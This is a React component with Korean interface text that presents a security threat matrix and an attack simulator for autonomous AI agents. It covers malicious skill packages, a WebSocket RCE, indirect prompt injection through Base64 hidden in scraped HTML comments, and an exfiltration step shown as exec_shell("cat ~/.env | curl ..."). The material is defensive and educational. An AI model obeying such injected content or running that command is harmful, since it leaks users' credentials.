import React, { useState } from 'react';
import { THREAT_MATRIX, SECURITY_CHECKLIST } from '../data/reportData';
import { ThreatItem, SecurityCheckItem } from '../types';
import { ShieldAlert, ShieldCheck, AlertTriangle, Bug, Terminal, Lock, ChevronRight, CheckCircle2, XCircle, SlidersHorizontal } from 'lucide-react';

interface SecurityMatrixSectionProps {
  onShowToast: (msg: string, type?: 'success' | 'warning' | 'info') => void;
}

export const SecurityMatrixSection: React.FC<SecurityMatrixSectionProps> = ({ onShowToast }) => {
  const [selectedCategory, setSelectedCategory] = useState<string>('all');
  const [activeThreatDetail, setActiveThreatDetail] = useState<ThreatItem | null>(null);

  // Attack Simulator state
  const [simState, setSimState] = useState<'idle' | 'running' | 'unhardened_fail' | 'hardened_success'>('idle');
  const [simStep, setSimStep] = useState<number>(0);

  // Checklist state
  const [checklist, setChecklist] = useState<SecurityCheckItem[]>(SECURITY_CHECKLIST);

  const toggleCheck = (id: string) => {
    setChecklist((prev) =>
      prev.map((item) => (item.id === id ? { ...item, checked: !item.checked } : item))
    );
  };

  const totalScore = checklist.reduce((acc, curr) => (curr.checked ? acc + curr.weight : acc), 0);

  const filteredThreats = THREAT_MATRIX.filter((t) => {
    if (selectedCategory === 'all') return true;
    return t.category === selectedCategory;
  });

  const runAttackSimulation = (mode: 'unhardened' | 'hardened') => {
    setSimState('running');
    setSimStep(1);

    setTimeout(() => {
      setSimStep(2);
      setTimeout(() => {
        setSimStep(3);
        if (mode === 'unhardened') {
          setSimState('unhardened_fail');
          onShowToast('보안 경고: 비보호 에이전트에서 .env 크레덴셜이 C2 서버로 유출되었습니다!', 'warning');
        } else {
          setSimState('hardened_success');
          onShowToast('보안 통과: NVIDIA OpenShell 및 exec.approval이 공격을 완전히 차단했습니다.', 'success');
        }
      }, 700);
    }, 600);
  };

  return (
    <section id="security" className="space-y-8 pt-6">
      {/* Section Header */}
      <div className="border-l-4 border-rose-600 pl-4 space-y-1">
        <div className="flex items-center gap-2">
          <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-rose-100 text-rose-800 uppercase tracking-wider">
            OWASP & NIST Compliant
          </span>
          <span className="text-xs text-slate-400 font-mono">CVE & Threat Matrix</span>
        </div>
        <h3 className="text-2xl sm:text-3xl font-extrabold text-slate-900">
          보안 위협 매트릭스 & 다층 방어 체계(Defense-in-Depth)
        </h3>
        <p className="text-slate-600 text-xs sm:text-sm max-w-3xl leading-relaxed">
          에이전트가 로컬 시스템의 쉘과 파일에 자율 접근함에 따라 발생하는 공격 벡터(공급망 중독, CSWSH 웹소켓 RCE, 간접 프롬프트 인젝션)와 이에 대응하는 커널/샌드박스 통제 프레임워크입니다.
        </p>
      </div>

      {/* Filter Buttons */}
      <div className="flex flex-wrap gap-2">
        <button
          onClick={() => setSelectedCategory('all')}
          className={`px-3.5 py-1.5 rounded-xl text-xs font-bold transition ${
            selectedCategory === 'all'
              ? 'bg-slate-900 text-white shadow-xs'
              : 'bg-white text-slate-700 border border-slate-200 hover:bg-slate-50'
          }`}
        >
          전체 위협 ({THREAT_MATRIX.length})
        </button>
        <button
          onClick={() => setSelectedCategory('supply')}
          className={`px-3.5 py-1.5 rounded-xl text-xs font-bold transition ${
            selectedCategory === 'supply'
              ? 'bg-rose-700 text-white shadow-xs'
              : 'bg-white text-rose-700 border border-rose-200 hover:bg-rose-50'
          }`}
        >
          공급망 중독 (ClawHub)
        </button>
        <button
          onClick={() => setSelectedCategory('rce')}
          className={`px-3.5 py-1.5 rounded-xl text-xs font-bold transition ${
            selectedCategory === 'rce'
              ? 'bg-amber-600 text-white shadow-xs'
              : 'bg-white text-amber-700 border border-amber-200 hover:bg-amber-50'
          }`}
        >
          웹소켓 CVE-2026-25253
        </button>
        <button
          onClick={() => setSelectedCategory('injection')}
          className={`px-3.5 py-1.5 rounded-xl text-xs font-bold transition ${
            selectedCategory === 'injection'
              ? 'bg-indigo-700 text-white shadow-xs'
              : 'bg-white text-indigo-700 border border-indigo-200 hover:bg-indigo-50'
          }`}
        >
          간접 프롬프트 인젝션
        </button>
        <button
          onClick={() => setSelectedCategory('exfiltration')}
          className={`px-3.5 py-1.5 rounded-xl text-xs font-bold transition ${
            selectedCategory === 'exfiltration'
              ? 'bg-purple-700 text-white shadow-xs'
              : 'bg-white text-purple-700 border border-purple-200 hover:bg-purple-50'
          }`}
        >
          도구 호출 은닉 유출
        </button>
      </div>

      {/* Threat Cards Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {filteredThreats.map((threat) => (
          <div
            key={threat.id}
            onClick={() => setActiveThreatDetail(activeThreatDetail?.id === threat.id ? null : threat)}
            className="cursor-pointer bg-white p-5 rounded-3xl border border-slate-200 hover:border-rose-300 hover:shadow-sm transition-all space-y-3"
          >
            <div className="flex items-center justify-between">
              <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-extrabold ${
                threat.severity === 'Critical'
                  ? 'bg-rose-100 text-rose-800'
                  : 'bg-amber-100 text-amber-800'
              }`}>
                {threat.severity}
              </span>
              <span className="font-mono text-[10px] text-slate-400 font-bold">{threat.codeName}</span>
            </div>

            <div>
              <h4 className="font-bold text-slate-900 text-sm leading-snug">{threat.title}</h4>
              <p className="text-xs text-slate-600 mt-1 leading-relaxed">{threat.description}</p>
            </div>

            <div className="p-3 bg-slate-50 rounded-2xl border border-slate-100 text-xs space-y-1">
              <span className="font-bold text-slate-700 text-[11px] block">공격 벡터:</span>
              <p className="text-slate-600 text-[11px] leading-relaxed">{threat.attackVector}</p>
            </div>

            <div className="pt-2 border-t border-slate-100 flex items-center justify-between text-[11px]">
              <span className="text-slate-500">방어 도구: <b className="text-emerald-700">{threat.defenseTool}</b></span>
              <span className="text-rose-600 font-bold flex items-center gap-0.5">
                {activeThreatDetail?.id === threat.id ? '상세 접기' : '시나리오 보기'}
                <ChevronRight className={`w-3.5 h-3.5 transition-transform ${activeThreatDetail?.id === threat.id ? 'rotate-90' : ''}`} />
              </span>
            </div>

            {/* Expandable Scenario Detail */}
            {activeThreatDetail?.id === threat.id && (
              <div className="pt-3 border-t border-rose-100 text-xs text-slate-700 space-y-2 bg-rose-50/50 p-3 rounded-2xl animate-in fade-in duration-200">
                <div>
                  <span className="font-bold text-rose-900 block">실제 피해 시나리오:</span>
                  <p className="text-[11px] text-rose-800 mt-0.5 leading-relaxed">{threat.realWorldScenario}</p>
                </div>
                <div>
                  <span className="font-bold text-emerald-900 block">권장 대응책:</span>
                  <p className="text-[11px] text-emerald-800 mt-0.5 leading-relaxed">{threat.mitigation}</p>
                </div>
              </div>
            )}
          </div>
        ))}
      </div>

      {/* Interactive Attack vs Hardened Defense Sandbox Simulator */}
      <div className="bg-slate-950 text-white p-6 sm:p-8 rounded-3xl border border-slate-800 shadow-xl space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4">
          <div>
            <div className="flex items-center gap-2">
              <Bug className="w-5 h-5 text-rose-400" />
              <h4 className="text-base font-bold text-white">
                실시간 침투 vs 방어 샌드박스 시뮬레이터
              </h4>
            </div>
            <p className="text-xs text-slate-400 mt-0.5">
              공격자가 악성 ClawHub 스킬을 통해 시스템 쉘 침투를 시도할 때 보호 조치 유무에 따른 결과를 대조합니다.
            </p>
          </div>
          <div className="flex gap-2">
            <button
              onClick={() => runAttackSimulation('unhardened')}
              disabled={simState === 'running'}
              className="px-3 py-1.5 bg-rose-900/80 hover:bg-rose-800 border border-rose-700 text-rose-200 text-xs font-bold rounded-xl transition disabled:opacity-50"
            >
              1. 미보호 환경 침투 테스트
            </button>
            <button
              onClick={() => runAttackSimulation('hardened')}
              disabled={simState === 'running'}
              className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold rounded-xl transition shadow-xs disabled:opacity-50"
            >
              2. 하드닝(방어) 환경 테스트
            </button>
          </div>
        </div>

        {/* Simulator Flow Visualization */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
          <div className={`p-4 rounded-2xl border transition-all ${
            simStep >= 1 ? 'bg-slate-800 border-indigo-500 text-white' : 'bg-slate-900/60 border-slate-800 text-slate-500'
          }`}>
            <div className="text-[10px] font-mono text-indigo-400 font-bold mb-1">STEP 1. 악성 프롬프트 유입</div>
            <div className="font-bold">웹 스크래핑 HTML 주석 내 Base64 페이로드 인식</div>
          </div>

          <div className={`p-4 rounded-2xl border transition-all ${
            simStep >= 2
              ? simState === 'unhardened_fail'
                ? 'bg-rose-950/80 border-rose-500 text-rose-100'
                : 'bg-emerald-950/80 border-emerald-500 text-emerald-100'
              : 'bg-slate-900/60 border-slate-800 text-slate-500'
          }`}>
            <div className="text-[10px] font-mono font-bold mb-1">
              {simState === 'hardened_success' ? 'STEP 2. NVIDIA 샌드박스 차단' : 'STEP 2. 시스템 쉘 실행 시도'}
            </div>
            <div className="font-bold">
              {simState === 'hardened_success'
                ? 'exec.approval 팝업 강제 & Egress 외부 IP 차단'
                : '루트 권한 exec_shell("cat ~/.env | curl ...") 호출'}
            </div>
          </div>

          <div className={`p-4 rounded-2xl border transition-all ${
            simStep >= 3
              ? simState === 'unhardened_fail'
                ? 'bg-rose-900 border-rose-400 text-white ring-2 ring-rose-500'
                : 'bg-emerald-900 border-emerald-400 text-white ring-2 ring-emerald-500'
              : 'bg-slate-900/60 border-slate-800 text-slate-500'
          }`}>
            <div className="text-[10px] font-mono font-bold mb-1">
              {simState === 'unhardened_fail' ? 'STEP 3. 결과: 침해 사고 발생' : 'STEP 3. 결과: 완전 방어'}
            </div>
            <div className="font-bold">
              {simState === 'unhardened_fail'
                ? '호스트 API 키 탈취 완료 (CVE-2026-25253)'
                : '공격 실패: 악성 스크립트 격리 컨테이너에서 무력화'}
            </div>
          </div>
        </div>
      </div>

      {/* Interactive Security Readiness Checklist & Scorecard */}
      <div className="bg-white p-6 sm:p-8 rounded-3xl border border-slate-200 shadow-xs space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-100 pb-4">
          <div>
            <h4 className="text-base font-bold text-slate-900 flex items-center gap-2">
              <ShieldCheck className="w-4 h-4 text-emerald-600" />
              배포 전 필수 보안 점검표 & 신뢰도 스코어
            </h4>
            <p className="text-xs text-slate-500 mt-0.5">
              자율 에이전트 구동 전 아래 5가지 방어 수칙을 적용했는지 점검하세요.
            </p>
          </div>

          {/* Dynamic Score Badge */}
          <div className="flex items-center gap-3 p-3 bg-slate-50 rounded-2xl border border-slate-200">
            <div className="text-right">
              <div className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">보안 준비도 점수</div>
              <div className="text-xl font-black text-slate-900 font-mono">{totalScore} / 100점</div>
            </div>
            <div className={`w-10 h-10 rounded-xl flex items-center justify-center font-bold text-white text-sm ${
              totalScore >= 80 ? 'bg-emerald-600' : totalScore >= 50 ? 'bg-amber-500' : 'bg-rose-600'
            }`}>
              {totalScore >= 80 ? '안전' : totalScore >= 50 ? '주의' : '위험'}
            </div>
          </div>
        </div>

        {/* Checklist Items */}
        <div className="space-y-3">
          {checklist.map((item) => (
            <div
              key={item.id}
              onClick={() => toggleCheck(item.id)}
              className={`cursor-pointer p-4 rounded-2xl border transition-all flex items-start gap-3.5 ${
                item.checked
                  ? 'bg-emerald-50/40 border-emerald-200 shadow-2xs'
                  : 'bg-slate-50/60 border-slate-200 hover:border-slate-300'
              }`}
            >
              <div className={`mt-0.5 w-5 h-5 rounded-md flex items-center justify-center transition ${
                item.checked ? 'bg-emerald-600 text-white' : 'border-2 border-slate-300 bg-white'
              }`}>
                {item.checked && <CheckCircle2 className="w-4 h-4" />}
              </div>

              <div className="flex-1 text-xs">
                <div className="flex items-center justify-between">
                  <span className={`font-bold ${item.checked ? 'text-slate-900' : 'text-slate-600'}`}>
                    {item.label}
                  </span>
                  <span className="text-[10px] font-mono font-bold text-slate-400">+{item.weight}점</span>
                </div>
                <p className="text-slate-500 text-[11px] mt-1 leading-relaxed">{item.recommendation}</p>
              </div>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
};
